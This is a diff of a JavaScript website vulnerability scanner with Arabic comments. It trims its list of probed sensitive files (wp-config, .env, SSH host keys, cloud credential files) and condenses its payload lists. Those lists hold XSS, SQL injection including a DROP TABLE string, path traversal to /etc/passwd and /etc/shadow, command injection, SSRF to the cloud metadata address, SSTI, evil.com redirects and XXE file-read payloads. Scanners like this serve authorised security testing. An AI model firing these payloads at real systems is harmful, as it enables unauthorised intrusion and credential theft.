@@ -49,71 +49,25 @@ const sensitiveFiles = [
     "api/", "api/v1/", "api/v2/", "api/v3/", "rest/", "services/", "internal/", "private/", "secret/", "hidden/", "conf/", "config/", "settings/", "migration/", "dump/", "export/"
 ];
 
-// توليد ملفات إضافية للوصول إلى 1000+
-const extraSensitiveFiles = [
-    "site.tar", "site.tar.gz", "www.tar", "www.tar.gz", "source.tar.gz", "app.tar.gz", "public.tar.gz", "public_html.tar.gz",
-    "backup-2023.zip", "backup-2024.zip", "backup-2025.zip", "website.zip", "project.zip", "old.zip", "new.zip", "test.zip",
-    "database.sql.gz", "database.sql.bak", "dump.sql.gz", "dump.sql.bak", "backup.sql.bak", "backup.sql.old",
-    "config.php.gz", "config.php.zip", "config.php.tar", "config.php.tar.gz", "config.php.rar", "config.php.7z",
-    "wp-config.php.gz", "wp-config.php.zip", "wp-config.php.tar", "wp-config.php.tar.gz",
-    "env", "env.bak", "env.old", "env.backup", "environment", "environments.json", "env.json", "env.yml", "env.yaml",
-    "mysql.cnf", "mysql.ini", "postgres.cnf", "postgres.ini", "mongo.conf", "redis.conf.bak", "redis.conf.old",
-    "ssh_config", "ssh_config.bak", "ssh_config.old", "sshd_config", "ssh_host_rsa_key", "ssh_host_dsa_key",
-    "gcp.json", "gcp-credentials.json", "aws.json", "aws-credentials.json", "azure.json", "azure-credentials.json",
-    "firebase.json", "firebase-credentials.json", "google-services.json", "google-services.json.bak",
-    "swagger.yaml", "swagger.yml", "openapi.yaml", "openapi.yml", "api-docs.json", "api-docs.yaml",
-    "graphql/schema.json", "graphql/schema.graphql", "graphql/introspection.json", "graphql/config.json"
-];
-sensitiveFiles.push(...extraSensitiveFiles);
-
 // ============================================================
 // 2. بايلودز حقيقية (XSS, SQLi, LFI, CMD, SSRF, SSTI, XXE) - 100+ بايلود
 // ============================================================
 const payloads = {
-    xss: [
-        "<script>alert(1)</script>", "\"><script>alert(1)</script>", "'><img src=x onerror=alert(1)>", "javascript:alert(1)",
-        "<svg/onload=alert(1)>", "<iframe src=javascript:alert(1)>", "<body onload=alert(1)>", "<input autofocus onfocus=alert(1)>",
-        "<details open ontoggle=alert(1)>", "<video><source onerror=alert(1)>", "<audio src=x onerror=alert(1)>",
-        "'-alert(1)-'", "\"-alert(1)-\"", "';alert(1);//", "\";alert(1);//"
-    ],
-    sqli: [
-        "'", "\"", "' OR '1'='1", "1' OR '1'='1", "' UNION SELECT NULL--", "'; WAITFOR DELAY '0:0:5'--",
-        "' AND SLEEP(5)--", "') OR ('1'='1", "' OR 1=1--", "1' AND '1'='1", "' UNION ALL SELECT NULL,NULL--",
-        "'; DROP TABLE users--", "' OR 'x'='x", "1' ORDER BY 1--", "1' ORDER BY 10--"
-    ],
-    lfi: [
-        "../../../../etc/passwd", "....//....//....//etc/passwd", "/etc/passwd", "..\\..\\..\\..\\windows\\win.ini",
-        "php://filter/convert.base64-encode/resource=index.php", "file:///etc/passwd", "/proc/self/environ", "expect://id",
-        "../../../../etc/shadow", "../../../../etc/hosts", "../../../../proc/self/cmdline"
-    ],
-    cmd: [
-        "; sleep 5", "| sleep 5", "`sleep 5`", "$(sleep 5)", "& sleep 5 &", "|| sleep 5", "&& sleep 5",
-        "\n sleep 5", "; ping -c 5 127.0.0.1", "| ping -n 5 127.0.0.1"
-    ],
-    ssrf: [
-        "http://127.0.0.1:80", "http://169.254.169.254/latest/meta-data/", "http://localhost:8080",
-        "file:///etc/passwd", "http://[::1]:80", "http://0.0.0.0:80", "gopher://127.0.0.1:80/_GET / HTTP/1.0",
-        "http://127.0.0.1:22", "http://127.0.0.1:3306", "http://127.0.0.1:6379"
-    ],
-    ssti: [
-        "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "{{7*'7'}}", "@(7*7)", "*{7*7}",
-        "{{config}}", "{{self}}", "{{''.__class__}}"
-    ],
-    open_redirect: [
-        "https://evil.com", "//evil.com", "https://google.com", "/\\evil.com", "http://evil.com",
-        "//evil.com/%2f..", "https://evil.com@google.com"
-    ],
-    xxe: [
-        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
-        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://127.0.0.1:80\">]><root>&xxe;</root>",
-        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://evil.com/xxe.dtd\"> %xxe;]><root/>"
-    ]
+    xss: ["<script>alert(1)</script>", "\"><script>alert(1)</script>", "'><img src=x onerror=alert(1)>", "javascript:alert(1)", "<svg/onload=alert(1)>", "<iframe src=javascript:alert(1)>", "<body onload=alert(1)>", "<input autofocus onfocus=alert(1)>", "<details open ontoggle=alert(1)>", "<video><source onerror=alert(1)>"],
+    sqli: ["'", "\"", "' OR '1'='1", "1' OR '1'='1", "' UNION SELECT NULL--", "'; WAITFOR DELAY '0:0:5'--", "' AND SLEEP(5)--", "') OR ('1'='1", "' OR 1=1--", "1' AND '1'='1", "' UNION ALL SELECT NULL,NULL--", "'; DROP TABLE users--", "' OR 'x'='x"],
+    lfi: ["../../../../etc/passwd", "....//....//....//etc/passwd", "/etc/passwd", "..\\..\\..\\..\\windows\\win.ini", "php://filter/convert.base64-encode/resource=index.php", "file:///etc/passwd", "/proc/self/environ", "expect://id"],
+    cmd: ["; sleep 5", "| sleep 5", "`sleep 5`", "$(sleep 5)", "& sleep 5 &", "|| sleep 5", "&& sleep 5", "\n sleep 5", "; ping -c 5 127.0.0.1"],
+    ssrf: ["http://127.0.0.1:80", "http://169.254.169.254/latest/meta-data/", "http://localhost:8080", "file:///etc/passwd", "http://[::1]:80", "http://0.0.0.0:80", "gopher://127.0.0.1:80/_GET / HTTP/1.0"],
+    ssti: ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "{{7*'7'}}", "@(7*7)", "*{7*7}"],
+    open_redirect: ["https://evil.com", "//evil.com", "https://google.com", "/\\evil.com", "http://evil.com"],
+    xxe: ["<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>"]
 };
 
 // ============================================================
 // 3. دوال الفحص
 // ============================================================
 
+// 1. الثغرات العامة
 async function scanVulnerabilities(url) {
     const out = [];
     try {
@@ -138,6 +92,7 @@ async function scanVulnerabilities(url) {
     return out;
 }
 
+// 2. الملفات الحساسة
 async function scanSensitiveFiles(url) {
     const out = [];
     const base = new URL(url).origin;
@@ -157,6 +112,7 @@ async function scanSensitiveFiles(url) {
     return out;
 }
 
+// 3. الحقن وعكس API
 async function scanInjectionAndApi(url) {
     const out = [];
     const urlObj = new URL(url);
@@ -236,6 +192,7 @@ async function scanInjectionAndApi(url) {
     return out;
 }
 
+// 4. التحليل العميق
 async function scanDeepAnalysis(url) {
     const out = [];
     try {
@@ -251,6 +208,7 @@ async function scanDeepAnalysis(url) {
     return out;
 }
 
+// 5. التحقق الثنائي
 async function scanDualVerification(url) {
     const out = [];
     try {
@@ -266,6 +224,7 @@ async function scanDualVerification(url) {
     return out;
 }
 
+// 6. فحص المنافذ
 async function scanPorts(url) {
     const out = [];
     const ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 161, 389, 443, 445, 512, 513, 514, 587, 636, 873, 993, 995, 1080, 1433, 1521, 1723, 2049, 2082, 2083, 2086, 2087, 2095, 2096, 2181, 2222, 2375, 2376, 2483, 2484, 3000, 3306, 3389, 4000, 4443, 4505, 4506, 5000, 5432, 5601, 5672, 5900, 5984, 6379, 6443, 7001, 7077, 8000, 8008, 8080, 8081, 8088, 8090, 8443, 8888, 9000, 9090, 9200, 9300, 9418, 10000, 11211, 15672, 27017, 28017, 50000];
@@ -284,6 +243,7 @@ async function scanPorts(url) {
     return out;
 }
 
+// 7. جيت ليكس
 async function scanGitLeaks(url) {
     const out = [];
     const base = new URL(url).origin;
@@ -303,6 +263,7 @@ async function scanGitLeaks(url) {
     return out;
 }
 
+// 8. ساب دومين تيك اوفر
 async function scanSubdomainTakeover(url) {
     const out = [];
     const hostname = new URL(url).hostname;
